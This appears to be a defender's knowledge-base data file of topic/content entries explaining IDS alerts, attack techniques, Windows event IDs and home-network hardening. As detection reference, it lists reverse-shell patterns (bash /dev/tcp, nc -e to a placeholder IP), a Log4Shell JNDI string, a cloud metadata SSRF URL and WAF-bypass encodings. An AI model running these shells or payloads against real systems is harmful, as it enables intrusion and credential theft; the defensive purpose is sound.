content: Detects TCP SYN scan patterns characteristic of Nmap's default scan mode (-sS). The scanner sends SYN packets to multiple ports and analyzes RST/SYN-ACK responses to map open ports. Common during reconnaissance phase. Remediation: block the source IP if external, investigate if internal (compromised host or unauthorized scanning).

topic: ET SCAN Potential SSH Brute Force
content: Fires when many SSH connection attempts are seen from the same source IP in a short time window. Indicates password guessing or credential stuffing against SSH. Remediation: use fail2ban, switch to key-only auth, restrict SSH access by IP via firewall.

topic: ET POLICY Outgoing Basic Auth Base64 HTTP Password
content: Detects HTTP Basic Authentication credentials being sent in cleartext (base64-encoded but not encrypted). This means passwords are visible to any network observer. Remediation: enforce HTTPS for all authenticated services, block HTTP basic auth at the proxy level.

topic: ET INFO Outgoing Connection to DynDNS Service
content: Detects connections to dynamic DNS providers (e.g., dyndns.org, no-ip.com). While legitimate for home users, attackers use DDNS for C2 infrastructure since domains can be quickly rotated. Investigate whether the destination is expected.

topic: ET TROJAN Possible Metasploit Reverse Shell
content: Detects network patterns matching Metasploit's reverse shell payloads (meterpreter or standard shells). This is a strong indicator of active exploitation. Immediate response: isolate the affected host, capture forensic evidence, block the C2 IP.

Detects periodic network connections matching known Command & Control beacon patterns. C2 beacons typically connect at regular intervals (e.g., every 60s) to a fixed external host. Look for: fixed intervals, small data exchange, encoded/encrypted payloads. Remediation: block destination, isolate host, run full malware scan.

topic: ET DNS Query to .onion Proxy Domain
content: Detects DNS queries attempting to resolve .onion (Tor hidden service) domains through a clearnet DNS proxy. Indicates a user or malware trying to access Tor services without running a local Tor client. Investigate the requesting host and the specific .onion domain.

topic: ET POLICY DNS Query for Cryptocurrency Mining Pool
content: Detects DNS lookups for known cryptocurrency mining pool domains. Could indicate cryptomining malware on an endpoint. Remediation: scan the host for miners, check CPU usage, block mining pool domains at DNS level.

topic: ET SCAN Potential VNC Brute Force
content: Detects multiple VNC authentication attempts from a single source. VNC brute force can give attackers graphical remote desktop access. Remediation: disable VNC if not needed, use VPN for remote access, enforce strong passwords, apply rate limiting.

topic: ET POLICY Possible Web Shell Upload
content: Detects HTTP POST requests that may contain web shell code (PHP, ASP, JSP). Web shells give attackers persistent remote command execution on web servers. Remediation: verify the upload, check web server for unauthorized files, review application upload controls.

Detects Link-Local Multicast Name Resolution (LLMNR) broadcast queries on UDP port 5355. LLMNR is vulnerable to poisoning attacks where a rogue responder captures NTLMv2 hashes (via tools like Responder). Remediation: disable LLMNR via Group Policy.

Detects NetBIOS Name Service queries on UDP port 137. Like LLMNR, NBNS is exploitable via poisoning to capture credential hashes. Common in Windows environments. Remediation: disable NetBIOS over TCP/IP in network adapter settings or via DHCP option 001.

Detects SMBv1 protocol negotiation. SMBv1 is deprecated and vulnerable to EternalBlue (MS17-010), WannaCry, and other exploits. No modern system should use it. Remediation: disable SMBv1 on all systems via PowerShell: Set-SmbServerConfiguration -EnableSMB1Protocol $false.

Detects TCP connections to port 3389 (Remote Desktop Protocol). If unexpected, this may indicate brute force or lateral movement. Remediation: use Network Level Authentication (NLA), restrict RDP to VPN-only access, enable account lockout policies.

topic: ET POLICY Executable Download from HTTP
content: Detects PE (Windows executable) files being downloaded over unencrypted HTTP. Attackers often host malware on HTTP for initial access. Legitimate software should use HTTPS. Investigate the source URL and the downloading host.
Detects failed TLS handshakes which may indicate downgrade attacks, expired certificates, or cipher suite mismatches. If frequent from one source, may indicate scanning or misconfigured clients.

Detects unusually long DNS queries or high-frequency DNS requests to a single domain, patterns consistent with DNS tunneling used for data exfiltration or C2. Tools like iodine and dnscat2 use this technique. Remediation: block the tunneling domain, monitor DNS query lengths.

topic: ET POLICY Internal to Internal SSH Connection
content: Detects SSH connections between internal hosts. While often legitimate (admin tasks), unexpected internal SSH may indicate lateral movement by an attacker who has compromised one host. Verify with the source host owner.

Detects Windows Remote Management (WinRM) connections on ports 5985/5986. WinRM is used for remote PowerShell execution. Attackers use it for lateral movement. Ensure only authorized admins use WinRM and restrict it via firewall rules.

topic: ET POLICY Suspicious Large DNS Response
content: Detects DNS responses larger than normal (often >512 bytes for UDP). Large DNS responses may indicate DNS amplification attacks, DNS tunneling exfiltration, or zone transfer attempts.

Detects a host scanning many ports on a target in rapid succession. This is more aggressive than a typical SYN scan and indicates active reconnaissance. The scanner is mapping the full attack surface.

Detects HTTP CONNECT method requests, used to establish tunnels through HTTP proxies. Attackers use this to bypass firewall restrictions and exfiltrate data. Verify if the proxy should allow CONNECT to the destination.

topic: ET INFO Observed Discord Webhook Usage
content: Detects HTTP POST requests to Discord webhook URLs. Malware increasingly uses Discord webhooks for exfiltration and C2 because they bypass many security tools. Investigate the sending process.

Detects HTTP requests with curl's default User-Agent string. While curl is a legitimate tool, it's also commonly used in exploitation scripts and post-exploitation for downloading tools. Check if curl usage is expected from the source host.

topic: ET EXPLOIT Apache Log4j RCE Attempt
content: Detects exploitation attempts of CVE-2021-44228 (Log4Shell). Attackers send JNDI lookup strings (${jndi:ldap://...}) in HTTP headers to trigger remote code execution. Patch immediately. Block JNDI lookups at the WAF level.

A SYN scan sends TCP SYN packets to target ports without completing the three-way handshake. Open ports respond with SYN-ACK, closed ports with RST. It's fast and relatively stealthy. Nmap uses this as its default scan type (-sS). Detection: look for many SYN packets from one source to different ports without corresponding full connections.

These scans exploit RFC 793 behavior where closed ports respond to unexpected flags with RST, while open ports silently drop the packet. FIN scan sends FIN flag, XMAS sends FIN+PSH+URG, NULL sends no flags. Used to evade simple SYN-only detection. Less reliable against Windows (which responds RST to everything).

Automated password guessing against SSH (port 22). Attackers try common username/password combinations at high speed. Indicators: many failed login attempts from one IP (auth.log shows 'Failed password'), increasing connection rate. Defense: key-only auth, fail2ban, non-standard port, AllowUsers directive.

Credential stuffing or password spraying against Remote Desktop Protocol (port 3389). Windows Event ID 4625 (failed logon) with Logon Type 10 indicates RDP failures. Defense: Network Level Authentication, account lockout policy, RDP gateway, VPN-only access.

Automated password guessing against HTTP services using Basic Authentication. The base64-encoded credentials are trivially decoded. Look for: many 401 responses from one IP, rapid request rate. Defense: rate limiting, account lockout, switch to token-based auth, HTTPS mandatory.

PsExec is a legitimate Sysinternals tool for remote execution, heavily used by attackers for lateral movement. It works by copying a service binary to the target's ADMIN$ share and starting it via the Service Control Manager (SCM). Detection: Windows Event IDs 7045 (new service), 4688 (process creation), and SMB writes to ADMIN$.

Windows Management Instrumentation (WMI) enables remote process execution via DCOM (port 135) or WinRM. Attackers use wmic.exe or PowerShell's Invoke-WmiMethod for fileless lateral movement. Detection: process creation (4688) with parent wmiprvse.exe, WMI event subscriptions.

Attackers copy tools/malware to target hosts using SMB administrative shares (C$, ADMIN$, IPC$). Requires valid credentials. Detection: unusual SMB writes to admin shares, new files appearing in C:\Windows, Event ID 5145 (detailed file share access).

Using stolen NTLM password hashes to authenticate to remote services without knowing the plaintext password. NTLM authentication accepts the hash directly. Tools: mimikatz, Impacket. Detection: Event ID 4624 Logon Type 3 with NTLM auth from unexpected sources. Defense: disable NTLM where possible, use Credential Guard.

Requesting Kerberos service tickets (TGS) for service accounts, then cracking them offline to recover passwords. Any domain user can request TGS for any service. Detection: Event ID 4769 with RC4 encryption type (0x17) for unusual services. Defense: use AES encryption, long complex service account passwords, managed service accounts.

Command-and-Control beacons connect to attacker infrastructure at regular intervals (e.g., every 30-120 seconds). They use small data exchanges (check-in/tasking) and often add random jitter. Detection: look for periodic connections to the same external host, especially with consistent packet sizes. Statistical analysis of connection timing reveals beaconing.

Encoding stolen data as DNS queries (subdomains of attacker-controlled domains). Each query carries a small amount of data. Tools: iodine, dnscat2, dns2tcp. Detection: unusually long domain names, high volume of queries to a single domain, NXDOMAIN responses, TXT record queries. Defense: DNS monitoring, query length limits.

When DNS fails, Windows falls back to LLMNR (UDP 5355) and NBNS (UDP 137) for name resolution, broadcasting queries on the local network. Attackers (using Responder) answer these broadcasts with their own IP, forcing victims to send NTLM authentication hashes. Defense: disable LLMNR via GPO, disable NBNS on network adapters.

Sending forged ARP replies to associate the attacker's MAC address with another host's IP. Enables man-in-the-middle attacks on the local network. Detection: duplicate IP-to-MAC mappings, ARP table changes. Defense: static ARP entries for critical hosts, Dynamic ARP Inspection (DAI) on switches.

Injecting SQL code into application inputs to manipulate database queries. Types: Union-based, blind (boolean/time), error-based, stacked queries. Detection: SQL keywords in HTTP parameters (UNION SELECT, OR 1=1), unusual database errors in responses. Defense: parameterized queries, input validation, WAF.

Injecting client-side scripts into web pages viewed by other users. Stored XSS persists in the database, reflected XSS comes from URL parameters. Enables session hijacking, credential theft, defacement. Detection: script tags or event handlers in HTTP parameters. Defense: output encoding, Content Security Policy, HTTPOnly cookies.

Tricking a server into making HTTP requests to internal resources (cloud metadata, internal APIs, databases). Attackers use URLs like http://169.254.169.254/latest/meta-data/ to steal cloud credentials. Defense: allowlist outbound URLs, block metadata endpoints, validate user-supplied URLs.

Exploiting file inclusion functions to read arbitrary files from the server (e.g., /etc/passwd, web.config). Common in PHP (include/require), Python (open), and template engines. Indicators: ../ traversal sequences in parameters. Defense: input validation, chroot, disable dynamic file inclusion.

Linux binaries with the SUID bit set run with the file owner's privileges (often root). Attackers find misconfigured SUID binaries to escalate privileges. Common targets: find, vim, python, nmap. Discovery: find / -perm -4000 -type f. Defense: audit SUID files regularly, remove unnecessary SUID bits.

Placing a malicious DLL in a location where a legitimate application will load it instead of the intended DLL. Windows searches the application directory first, allowing attackers to inject code. Detection: DLLs loaded from unusual paths, unsigned DLLs. Defense: SafeDllSearchMode, application whitelisting.

Forging Kerberos TGTs using the KRBTGT account hash (obtained via DCSync or domain controller compromise). Grants unrestricted access to any resource in the domain for the ticket lifetime. Detection: TGTs with unusual lifetimes, Event ID 4769 anomalies. Defense: reset KRBTGT password twice, monitor KRBTGT usage.

Using Directory Replication Service (DRS) protocol to request password hashes from a domain controller, mimicking a legitimate DC. Requires Replicating Directory Changes privileges. Detection: Event ID 4662 with DS-Replication-Get-Changes operations from non-DC sources. Defense: restrict replication permissions.

Mimikatz extracts passwords, hashes, PINs, and Kerberos tickets from Windows memory (LSASS process). Requires local admin access. Detection: LSASS access events (Sysmon Event ID 10), suspicious process injection. Defense: Credential Guard, Protected Users group, disable WDigest.

Attackers use legitimate system binaries for malicious purposes to avoid detection. Common LOLBins: certutil.exe (download files), mshta.exe (execute HTA), regsvr32.exe (execute code via DLLs), rundll32.exe, bitsadmin.exe. Detection: unusual command-line arguments for system utilities.

Attackers send stolen data out over HTTPS (port 443) which blends with normal web traffic. May use legitimate cloud services (Google Drive, Dropbox, paste sites) as exfil endpoints. Detection: unusual data volumes to external hosts, connections to known file sharing services from unexpected hosts.

To disable LLMNR: Computer Configuration > Administrative Templates > Network > DNS Client > Turn Off Multicast Name Resolution = Enabled. This prevents LLMNR poisoning attacks. Apply via GPO to all domain computers. For standalone machines, set the registry key HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast = 0.

To disable NBNS: Network adapter properties > TCP/IPv4 > Advanced > WINS tab > Disable NetBIOS over TCP/IP. For DHCP-assigned addresses, set DHCP option 001 to 0x2. This prevents NBNS poisoning. Can also be done via GPO with a startup script or DHCP server configuration.

Windows Server: Set-SmbServerConfiguration -EnableSMB1Protocol $false (PowerShell). Windows Client: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol. Linux Samba: add 'min protocol = SMB2' to smb.conf. SMBv1 is vulnerable to EternalBlue and should never be enabled on modern systems.

GPO path: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options. Set 'Microsoft network client: Digitally sign communications (always)' = Enabled. Also set server-side signing. This prevents SMB relay attacks.

1) Disable password auth: PasswordAuthentication no. 2) Use key-only: PubkeyAuthentication yes. 3) Disable root login: PermitRootLogin no. 4) Use AllowUsers/AllowGroups to restrict access. 5) Change port from 22 (security through obscurity, minor benefit). 6) Install fail2ban. 7) Use ed25519 keys. Edit /etc/ssh/sshd_config and restart sshd.

Install: apt install fail2ban. Create /etc/fail2ban/jail.local with: [sshd] enabled=true, maxretry=3, bantime=3600, findtime=600. This bans IPs for 1 hour after 3 failed SSH attempts in 10 minutes. Check status: fail2ban-client status sshd. Unban: fail2ban-client set sshd unbanip IP.

Enable via: auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable. Or GPO: Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy > Logon/Logoff. This generates Event IDs 4624 (successful logon), 4625 (failed logon), 4634 (logoff).

topic: Block Common Attack Ports at Firewall
content: Block inbound from internet: 445 (SMB), 135-139 (NetBIOS/RPC), 3389 (RDP unless VPN), 5985-5986 (WinRM), 1433 (MSSQL), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 27017 (MongoDB). These services should never be directly exposed. Use VPN or SSH tunnels for remote access.

Separate your network into security zones: 1) Management VLAN (IT/admin), 2) User VLAN (workstations), 3) Server VLAN, 4) IoT/Guest VLAN, 5) DMZ (public-facing). Apply firewall rules between VLANs. IoT devices should not reach management or server networks. Log inter-VLAN traffic for monitoring.

1) Isolate: disconnect from network (don't power off — preserves memory). 2) Preserve: capture memory dump, disk image if possible. 3) Investigate: check running processes, network connections, recently modified files, scheduled tasks, startup items. 4) Remediate: remove malware, reset credentials, patch vulnerability. 5) Monitor: watch for re-infection.

1) Block the attacking IP at the firewall. 2) Check if any logins succeeded (Event ID 4624 following 4625s from same IP). 3) If success found: treat as compromise, reset affected account password. 4) Review account lockout policies. 5) Consider geo-blocking if attacks come from unexpected countries. 6) Add permanent firewall rule or fail2ban.

1) Do NOT alert the attacker — isolate quietly. 2) Block the C2 IP/domain at firewall and DNS. 3) Identify all hosts communicating with the C2. 4) Capture memory from affected hosts. 5) Run EDR/AV full scans. 6) Check for persistence mechanisms (scheduled tasks, services, registry). 7) Reset credentials for affected users. 8) Report to management.

Credential Guard uses virtualization-based security to isolate LSASS, preventing tools like Mimikatz from extracting credentials. Enable via GPO: Computer Configuration > Administrative Templates > System > Device Guard > Turn On Virtualization Based Security > Credential Guard = Enabled. Requires UEFI Secure Boot and TPM 2.0.

1) Generate or obtain TLS certificate (Let's Encrypt for public, self-signed for internal). 2) Configure web servers to redirect HTTP to HTTPS. 3) Set HSTS header: Strict-Transport-Security: max-age=31536000. 4) Disable TLS 1.0/1.1, only allow TLS 1.2+. 5) Use strong cipher suites (AEAD ciphers like AES-GCM).

TCP connections start with: 1) Client sends SYN, 2) Server responds SYN-ACK, 3) Client sends ACK. After this, data transfer begins. A connection closes with FIN/ACK exchange. Understanding this is essential for interpreting IDS alerts — a SYN without ACK is a half-open scan.

DNS resolution: 1) Client queries local DNS resolver (usually router/ISP). 2) Resolver checks cache. 3) If not cached, queries root servers → TLD servers → authoritative servers. 4) Result cached with TTL. Common record types: A (IPv4), AAAA (IPv6), MX (mail), CNAME (alias), TXT (text data, SPF, DKIM).

Secure Shell provides encrypted remote terminal access and file transfer (SFTP/SCP). Default port 22. SSH protocol versions: SSHv1 (broken, never use), SSHv2 (current). Key exchange algorithms: curve25519-sha256 preferred. Authentication: public key (preferred), password (discouraged), keyboard-interactive.

Domain Name System. UDP 53 for standard queries (<512 bytes), TCP 53 for zone transfers and large responses. DNS is unencrypted by default — all queries visible to network observers. Encrypted alternatives: DNS over HTTPS (DoH, port 443), DNS over TLS (DoT, port 853). DNSSEC provides authentication but not encryption.

HTTP (port 80) is unencrypted web traffic. HTTPS (port 443) adds TLS encryption. TLS 1.3 (current) removed legacy features and is faster (1-RTT handshake). HTTP/2 multiplexes requests over one connection. HTTP/3 uses QUIC (UDP-based). Security note: HTTPS only encrypts data in transit — the destination IP and domain (via SNI) are still visible.

Server Message Block protocol for Windows file sharing, printer sharing, and IPC. SMBv1 is obsolete and dangerous. SMBv2 (Vista+) and SMBv3 (Windows 8+, with encryption) are current. Port 445 directly hosts SMB; ports 137-139 are legacy NetBIOS transport. Never expose port 445 to the internet.

Remote Desktop Protocol provides graphical remote access to Windows systems. Supports encryption via TLS and NLA (Network Level Authentication). NLA requires authentication before session creation, reducing denial-of-service risk. Commonly targeted by brute force and exposed in internet scans. Never expose directly to the internet.

Link-Local Multicast Name Resolution. Used when DNS fails — Windows broadcasts name queries on the local subnet using multicast (224.0.0.252). Only works on the local network segment. Vulnerable to poisoning since any host can respond. Disable via GPO in production environments.

NetBIOS over TCP/IP provides name resolution (137/UDP), datagram (138/UDP), and session (139/TCP) services. Legacy Windows networking protocol. NBNS (port 137) is vulnerable to poisoning similar to LLMNR. Sessions on port 139 were used for SMBv1. Modern Windows uses direct SMB on port 445 instead.

Port 1514 is used by Wazuh agents to send events to the Wazuh Manager (encrypted with TLS). Port 1515 is for agent enrollment/registration. Both ports must be open on the manager's firewall for endpoint agents to communicate. Events include file integrity changes, log analysis results, and vulnerability detections.

Traditional syslog protocol for log forwarding. UDP 514 by default (unreliable, no encryption). TCP 514 adds reliability. Syslog-TLS (port 6514) adds encryption. Format: <priority>timestamp hostname app-name: message. Facilities (kern, auth, daemon, etc.) and severities (emergency through debug) provide categorization.

Internet Control Message Protocol is used for network diagnostics (ping, traceroute) and error reporting. Type 8 = echo request (ping), Type 0 = echo reply. ICMP can be used for covert channels (data hidden in ping payloads). Some networks block ICMP, which breaks path MTU discovery and traceroute.

Address Resolution Protocol maps IP addresses to MAC addresses on local networks. Operates at Layer 2. Stateless — hosts accept unsolicited ARP replies (enabling ARP spoofing attacks). Gratuitous ARP announces IP-to-MAC bindings proactively. ARP table entries expire (typically 2-20 minutes).

TLS 1.2 uses a 2-RTT handshake and supports many cipher suites including weak ones. TLS 1.3 uses a 1-RTT handshake (faster), removed all legacy algorithms (RSA key exchange, RC4, SHA1, MD5, DES, 3DES), and only supports AEAD ciphers (AES-GCM, ChaCha20-Poly1305). Always prefer TLS 1.3 when available.

Dynamic Host Configuration Protocol assigns IP addresses automatically. Process: DISCOVER → OFFER → REQUEST → ACKNOWLEDGE. DHCP runs on UDP ports 67 (server) and 68 (client). DHCP starvation attacks exhaust the address pool. DHCP spoofing provides rogue configurations (gateway, DNS). Defense: DHCP snooping on managed switches.

Network Time Protocol synchronizes clocks over UDP port 123. Accurate time is critical for log correlation, certificate validation, and Kerberos (5-minute tolerance). NTP amplification attacks abuse monlist command for DDoS. Use NTP authentication and restrict ntpd with 'restrict' directives. Prefer chrony over ntpd.

Place IoT devices (smart TVs, cameras, thermostats) on a separate VLAN or guest network. IoT devices often have weak security, no update mechanism, and phone home to cloud services. Firewall rules: IoT VLAN can reach internet but NOT your management/server VLANs. Block IoT → LAN traffic completely.

Recommended VLANs: VLAN 10 = Management (servers, NAS, network gear), VLAN 20 = Trusted devices (workstations, phones), VLAN 30 = IoT (smart home), VLAN 40 = Guest (visitors). Configure on your managed switch and router/firewall. pfSense/OPNsense can route between VLANs with firewall rules.

1) Block RFC1918 on WAN interface. 2) Enable and configure pfBlockerNG for IP/GeoIP blocking. 3) Set up DNS resolver with DNSSEC. 4) Create aliases for internal networks. 5) Log blocked traffic for monitoring. 6) Enable automatic rule expiration for temporary rules. 7) Back up config regularly via Diagnostics > Backup/Restore.

Pi-hole blocks ads and tracking at the DNS level. Install on a Raspberry Pi or VM. Point your DHCP/router DNS to Pi-hole's IP. Gravity lists block known ad/tracking domains. Custom blocklists add malware domain blocking. Check query logs for suspicious domains. Group management lets you apply different blocklists per client.

Use WPA3-Personal (SAE) if all devices support it, otherwise WPA2-Personal (AES-CCMP). Never use WEP or WPA-TKIP. Disable WPS (Wi-Fi Protected Setup — vulnerable to brute force). Use a strong passphrase (12+ chars). Create a separate guest network for visitors. Disable SSID broadcast provides no real security.

Universal Plug and Play (UPnP) allows devices to automatically create firewall port forwarding rules without user approval. Malware abuses UPnP to open ports for C2 and exfiltration. Disable UPnP on your router. Manually configure port forwarding only for services you need. Check for open UPnP ports with nmap --script upnp-info.

topic: Securing a NAS on Home Network
content: 1) Place NAS on management VLAN, not accessible from IoT/guest. 2) Disable default admin account, create named admin. 3) Enable 2FA if supported. 4) Disable unused services (FTP, Telnet, SSH if not needed). 5) Enable HTTPS only. 6) Set up snapshot-based backups for ransomware recovery. 7) Keep firmware updated.

Remote desktop tools create a significant attack surface. NoMachine listens on port 4000, TeamViewer on 5938. Security measures: 1) Restrict access by IP in NoMachine/iptables. 2) Use strong passwords or key-based auth. 3) Bind to localhost and use SSH tunnel for remote access. 4) Disable when not in use. 5) Monitor for unauthorized connections.

Only forward ports you absolutely need. Never forward management ports (SSH, RDP) directly — use VPN instead. Use non-standard external ports to reduce scanning noise. Regularly audit forwarded ports: they're direct paths into your network. Consider using a reverse proxy (Caddy, nginx) for web services to add TLS and rate limiting.

3-2-1 rule: 3 copies of data, 2 different media types, 1 offsite. For home: primary on NAS, daily backup to USB drive, offsite via encrypted cloud (Backblaze B2, rsync to VPS). NAS snapshots protect against ransomware. Test restores regularly. Keep backup drives disconnected when not in use (air gap).

Records successful logon events. Key logon types: Type 2 (interactive/console), Type 3 (network, e.g., SMB share access), Type 7 (unlock), Type 10 (RemoteInteractive/RDP). Check for: Type 3 logons from unexpected IPs (lateral movement), Type 10 from external IPs (RDP brute force success), logons at unusual hours.

Records failed authentication attempts. Status codes: 0xC000006A (wrong password), 0xC0000064 (unknown username), 0xC0000234 (account locked out), 0xC0000072 (account disabled). High volume from one source = brute force. Multiple accounts from one source = password spraying. Failure code helps determine if usernames are being enumerated.

Records every new process created. Shows: process name, command line (if audit enabled), parent process, user. Look for: cmd.exe/powershell.exe spawned by Office apps (macro execution), unusual executables in temp folders, base64 in command lines, processes spawned by services not normally interactive.

topic: Windows Event ID 4720 - User Account Created
content: Records when a new user account is created. Attackers create backdoor accounts for persistence. Alert on: accounts created outside of normal provisioning processes, accounts created by non-admin processes, accounts with names mimicking system accounts.

topic: Windows Event ID 7045 - New Service Installed
content: Records when a new Windows service is installed. Many attack tools (PsExec, Cobalt Strike) install services for execution. Alert on: services with random names, services running from temp/user directories, services with suspicious command lines (powershell -enc, cmd /c).

topic: Windows Event ID 1102 - Audit Log Cleared
content: Records when the Security event log is cleared. This is a strong indicator of an attacker covering their tracks. Should always generate a high-priority alert. Normal operations almost never require clearing security logs. Detection: forward to SIEM before attacker can delete the forwarded copy.

topic: Windows Event ID 4728/4732 - Group Membership Change
content: 4728: member added to security-enabled global group. 4732: member added to security-enabled local group. Alert on additions to: Administrators, Domain Admins, Enterprise Admins, Remote Desktop Users. Attackers add themselves to privileged groups for persistence.

Records when an account is locked out due to too many failed logon attempts. Could indicate: brute force attack, user forgot password, misconfigured service using old credentials. Check the source of the failed attempts (Event ID 4625) to determine cause.

Wazuh alert levels: 0-3 (low/informational), 4-7 (medium, policy violations, system changes), 8-11 (high, authentication failures, critical file changes), 12-15 (critical, known attacks, rootkit detection, system compromise). Levels 10+ typically warrant investigation. Level 12+ should be escalated.

Wazuh FIM monitors configured directories for changes (creation, modification, deletion). Generates alerts with file hash (sha256), who changed it, and what changed. Alert on changes to: system binaries (/usr/bin, C:\Windows\System32), web roots, SSH authorized_keys, crontabs, Windows startup folders.

Common suspicious processes: powershell with -enc (encoded commands), cmd.exe spawned by Word/Excel (macro execution), certutil.exe downloading files, mshta.exe running scripts, regsvr32.exe loading remote scripts, wmic.exe creating processes remotely, bitsadmin downloading files. Any of these from unexpected parents warrant investigation.

CrowdSec makes automated security decisions: ban (block IP completely), captcha (challenge suspicious requests), throttle (rate limit). Decisions are shared across the CrowdSec network — an IP flagged by other users may be preemptively blocked. Check the CrowdSec console for decision details and source scenarios.

Indicators of malware: 1) Persistent outbound connections to fixed IPs (C2). 2) DNS queries to newly registered domains. 3) High CPU usage (cryptomining). 4) Files in temp directories with random names. 5) Registry modifications to Run keys. 6) Scheduled tasks created for persistence. 7) Disabled security software. 8) Encrypted/obfuscated scripts.

Attackers add cron jobs for persistence and recurring malicious actions. Alert on: new entries in /etc/crontab, /etc/cron.d/, user crontabs. Suspicious patterns: downloading and executing scripts from URLs, reverse shells, cryptocurrency miners. Monitor with: Wazuh FIM on /etc/crontab and /var/spool/cron/.

Adding an SSH public key to ~/.ssh/authorized_keys gives password-less access. Attackers do this for persistence. Alert on any modification to authorized_keys files. Monitor with Wazuh FIM. Review: are all keys known and approved? Check key comments for identification.

Logged in /var/log/auth.log with 'sudo: user NOT in sudoers'. If a non-privileged user is attempting sudo, they may be an attacker exploring what privileges are available. Repeated failures may indicate privilege escalation attempts. Wazuh rule 5402 catches these.

Sudden large data transfers to external IPs may indicate exfiltration. Normal baseline varies by host — a server sending 10GB may be normal, a workstation sending 10GB is suspicious. Detection: Suricata flow records, netflow analysis, byte counters per connection. Investigate: what data, where to, who initiated.

topic: DNS Query to Recently Registered Domain
content: Newly registered domains (< 30 days old) are disproportionately used for phishing, malware C2, and spam. Legitimate services use established domains. Detection: query domain age via WHOIS, use threat intel feeds. Tools: DomainTools, VirusTotal, SecurityTrails.

Connections from known Tor exit node IPs indicate anonymous access, which may be used to evade attribution. While some users have legitimate privacy needs, Tor connections to sensitive services should be investigated. Detection: compare source IPs against Tor exit node list (updated hourly at check.torproject.org).

Reverse shells connect outbound from a compromised host to the attacker. Patterns: bash -i >& /dev/tcp/IP/PORT 0>&1, python -c 'import socket,subprocess...', nc -e /bin/sh IP PORT, PowerShell Invoke-Expression with Net.Sockets. Detection: outbound connections on unusual ports, shells with redirected stdin/stdout.

To detect C2 beacons: 1) Export connection logs with timestamps. 2) Group by destination IP/domain. 3) Calculate inter-connection intervals. 4) Low standard deviation in intervals = likely beacon. 5) Check for jitter (randomized delay). Tools: RITA, BeaKer, custom scripts analyzing Zeek/Suricata flow data.

IP reputation services aggregate reports from multiple sources. VirusTotal: checks IP against 70+ security vendors. AbuseIPDB: community reports of abuse (brute force, spam, scanning). Scoring: VT >3 malicious detections or AbuseIPDB >50% confidence = likely malicious. Clean IPs may still be compromised — reputation is one signal among many.

Community ID is a standardized flow hash that uniquely identifies network connections across different tools (Suricata, Zeek, Wireshark). Format: 1:base64hash. Enables correlation between IDS alerts and packet captures. Configured in suricata.yaml under community-id: enabled: true.

WAF bypass attempts include: URL encoding (%27 for single quote), double encoding, Unicode normalization, null bytes, case alternation (SeLeCt), comment injection (/**/), parameter pollution (id=1&id=2). Detection: look for encoded SQL/XSS patterns and non-standard character usage in HTTP parameters.
